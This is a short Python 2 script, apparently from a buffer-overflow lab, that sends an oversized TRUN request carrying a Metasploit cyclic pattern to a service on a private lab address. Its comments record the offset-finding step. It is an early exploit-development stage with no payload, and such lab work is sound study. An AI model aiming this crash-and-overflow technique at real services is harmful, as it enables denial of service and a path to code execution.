#!/usr/bin/python2
import time, struct, sys
import socket as so


server = '172.16.52.128'
port = 5555

prefix = 'TRUN .'
a_len = 2100

# command: $ msf-pattern_create -l 400
pattern = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A'
# ...then search for the offset:
# $ msf-pattern_offset -q Ak2A
# [*] Exact match at offset 306


#Stiching together the exploit
the_req = prefix + b'A' * (a_len - len(pattern)) + pattern

# Setting up the configuration
s = so.socket(so.AF_INET, so.SOCK_STREAM)

s.connect((server, port))
print repr(s.recv(1024))
s.send(the_req)
print repr(s.recv(1024))

s.close()

